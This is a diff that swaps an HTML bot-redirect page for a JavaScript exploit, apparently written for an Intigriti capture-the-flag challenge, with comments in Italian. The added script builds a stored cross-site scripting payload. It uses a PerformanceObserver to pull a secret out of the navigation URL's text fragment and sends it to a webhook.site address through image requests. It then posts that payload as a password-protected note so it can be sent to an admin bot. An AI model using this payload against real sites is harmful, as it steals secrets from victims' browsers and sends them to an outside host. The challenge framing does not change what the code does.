@@ -1,75 +1,144 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bot Redirect</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background-color: #f0f0f0;
-            font-family: sans-serif;
+(async () => {
+  console.log("Tentativo nota V19 CON PASSWORD (PerfObserver + Log Ingresso Callback)...");
+  try {
+    const WEBHOOK = 'https://webhook.site/ec2c1762-e345-4cd3-b76a-7c8482efe72d'; // Il tuo webhook
+
+    // Payload V19 - Aggiunge log all'inizio della callback (INVARIATO)
+    const perfObserverPayloadV19 = `
+      <script>
+        let flagFound = false;
+        let callbackEntered = false; // Nuovo flag
+
+        function send(params) {
+          try {
+            for (const key in params) {
+              if (typeof params[key] === 'string' && params[key].length > 500) {
+                params[key] = params[key].substring(0, 497) + '...';
+              }
+            }
+            const queryString = Object.keys(params).map(key => key + '=' + encodeURIComponent(params[key])).join('&');
+            new Image().src = '${WEBHOOK}?' + queryString;
+            console.log('V19 Sent:', params);
+          } catch (e) { console.error('V19 Send Error:', e); }
         }
-        #redirect-link {
-            display: block; /* Per poter impostare padding e dimensioni */
-            position: absolute; /* Per centrarlo precisamente */
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%); /* Centra l'elemento */
-            padding: 80px 100px; /* Rendi l'area cliccabile molto grande */
-            background-color: lightblue;
-            border: 2px solid blue;
-            text-decoration: none;
-            color: black;
-            font-size: 1.5em;
-            text-align: center;
-            border-radius: 10px;
-            cursor: pointer;
+
+        try {
+          send({ status: 'v19_script_started' });
+
+          const observer = new PerformanceObserver((list) => {
+             // --- NUOVO LOG IMMEDIATO ---
+             if (!callbackEntered) {
+                 callbackEntered = true; // Segna che siamo entrati almeno una volta
+                 send({ status: 'v19_OBSERVER_CALLBACK_ENTERED', entry_count: list.getEntries().length });
+             }
+             // --- FINE NUOVO LOG ---
+
+            if (flagFound) return;
+
+            list.getEntries().forEach((entry) => {
+              if (flagFound) return;
+
+              // Invia più dettagli sull'entry per debug
+              send({ status: 'v19_processing_entry', type: entry.entryType, name_len: entry.name?.length || 0 });
+
+
+              if (entry.entryType === 'navigation') { // Usa entryType invece di type
+                const navigationUrl = entry.name;
+                send({ status: 'v19_nav_entry_processing', url: navigationUrl }); // Log URL trovato
+
+                if (navigationUrl && navigationUrl.includes(':~:')) {
+                  const hashPartIndex = navigationUrl.indexOf(':~:');
+                  send({ status: 'v19_found_hashpart_in_nav_url', index: hashPartIndex });
+
+                  const secretData = navigationUrl.substring(hashPartIndex + 3);
+                  const colonIndex = secretData.indexOf(':');
+
+                  if (colonIndex !== -1) {
+                    const flag = secretData.substring(colonIndex + 1);
+                    send({ flag_final_v19: flag, source: 'perf_observer_nav_url' });
+                    flagFound = true;
+                    observer.disconnect();
+                  } else {
+                    send({ error: 'v19_no_colon_in_nav_url_data', data: secretData });
+                    flagFound = true;
+                    observer.disconnect();
+                  }
+                } else {
+                   send({ status: 'v19_no_hashpart_in_nav_url', url_len: navigationUrl.length });
+                }
+              } else {
+                  // Ignora altri tipi
+                  // send({ status: 'v19_ignoring_entry', type: entry.entryType });
+              }
+            });
+          });
+
+          observer.observe({ entryTypes: ['navigation'], buffered: true }); // Usa entryTypes (più moderno)
+          send({ status: 'v19_observer_attached' });
+
+        } catch (e) {
+          if (!flagFound && !callbackEntered) { // Invia errore solo se non siamo mai entrati nella callback
+            send({ error: 'v19_generic_catch', message: e.message });
+          } else if (!flagFound) {
+            // Errore dopo essere entrati nella callback ma prima di trovare la flag
+             send({ error: 'v19_generic_catch_inside_callback_maybe', message: e.message });
+          }
+        } finally {
+           send({ status: 'v19_script_finished_observer_waiting' });
         }
-        /* Messaggio opzionale per utenti normali */
-        .message {
-             position: absolute;
-             top: 10px;
-             left: 10px;
-             color: #555;
-        }
-    </style>
-</head>
-<body>
-    <div class="message">If you are not a bot, please wait or click the link...</div>
+      <\/script>
+      <img src='/' onerror='new Image().src="${WEBHOOK}?status=v19_img_onerror";'>
+    `;
 
-    <!-- Il link che il bot cliccherà -->
-    <a id="redirect-link" href="https://challenge-0325.intigriti.io/note/fde16168-7c25-4ee6-8794-fb90e5779a9b">
-        Redirecting...
-        <!-- Puoi mettere un testo più ovvio se vuoi testare manualmente: Click Me! -->
-    </a>
+    // --- MODIFICA RICHIESTA: Invio della richiesta POST con password ---
+    console.log("Invio richiesta per creare nota CON password...");
+    const response = await fetch("https://challenge-0325.intigriti.io/api/post", {
+      method: "POST",
+      // Usiamo gli header essenziali come nel tuo codice originale, principalmente Content-Type
+      headers: {
+          "Content-Type": "application/json",
+          "Accept": "*/*", // Aggiunto Accept per buona misura
+          // Nota: Non ho incluso tutti gli header specifici del browser (sec-ch-ua, etc.)
+          // dall'esempio che hai fornito, poiché potrebbero non essere necessari
+          // e il tuo codice originale non li usava. Se incontri problemi,
+          // potremmo doverli aggiungere.
+      },
+      body: JSON.stringify({
+        title: "PerfObserverDebug V19 PWD", // Titolo leggermente modificato per chiarezza
+        content: [ perfObserverPayloadV19 ], // Contenuto invariato
+        use_password: "true" // <-- MODIFICA CHIAVE: Imposta a true per usare la password
+      }),
+      // Non sono necessari referrerPolicy, cache-control, pragma, ecc. qui nel fetch JS,
+      // a meno che non sia specificamente richiesto dal server.
+    });
+    // --- FINE MODIFICA RICHIESTA ---
 
-    <script>
-        // Fallback: se il bot non clicca entro 5 secondi, reindirizza comunque.
-        // Questo potrebbe non essere necessario dato che il link è centrato, ma è una sicurezza.
-        const redirectUrl = "https://challenge-0325.intigriti.io/note/fde16168-7c25-4ee6-8794-fb90e5779a9b";
-        console.log("Redirecting to:", redirectUrl); // Log per debug
-        
-        // Il bot clicca quasi subito, quindi un redirect automatico
-        // potrebbe essere più affidabile del click, dato che non sappiamo
-        // se ci sono elementi che potrebbero coprire il centro esatto.
-        // Proviamo prima con un redirect immediato. Rimuovi il link se usi questo.
-        // window.location.href = redirectUrl;
+    // --- Gestione Risposta (MODIFICATA per gestire la password) ---
+    if (!response.ok) {
+      const errorText = await response.text();
+      throw new Error(`HTTP error! status: ${response.status} ${errorText}`);
+    }
+    const data = await response.json();
 
-        // Se preferisci affidarti al click + fallback:
-         setTimeout(() => {
-             console.log("Fallback redirect triggered.");
-             window.location.href = redirectUrl;
-         }, 5000); // 5 secondi di attesa
+    // Ora ci aspettiamo che l'API restituisca anche 'password'
+    if (data.id && data.password) {
+        const noteUrl = "https://challenge-0325.intigriti.io/note/" + data.id;
+        console.log("Nota V19 CON PASSWORD creata! ID:", data.id, "Password:", data.password, "URL:", noteUrl);
+        // Aggiorna il prompt per mostrare anche la password
+        prompt(`Copia URL V19 e invialo al bot (PASSWORD: ${data.password}):`, noteUrl);
+    } else if (data.id) {
+         // Fallback nel caso l'API non restituisca la password come previsto
+         const noteUrl = "https://challenge-0325.intigriti.io/note/" + data.id;
+         console.warn("Nota V19 creata MA SENZA password restituita dall'API? ID:", data.id, "URL:", noteUrl);
+         prompt("Copia URL V19 e invialo al bot (Password non ricevuta?):", noteUrl);
+    } else {
+        // Nessun ID restituito
+        throw new Error("API did not return ID: " + (data.message || JSON.stringify(data)));
+    }
 
-        // Se vuoi affidarti SOLO al click del bot (più rischioso se il centro non è preciso):
-        // Commenta o rimuovi il setTimeout sopra.
-    </script>
-
-</body>
-</html>
+  } catch (error) {
+      console.error("Errore nello script principale V19:", error);
+      // Potresti voler inviare un log di errore anche al webhook qui, se necessario
+      // new Image().src = `${WEBHOOK}?error=v19_main_script_catch&message=${encodeURIComponent(error.message)}`;
+  }
+})();
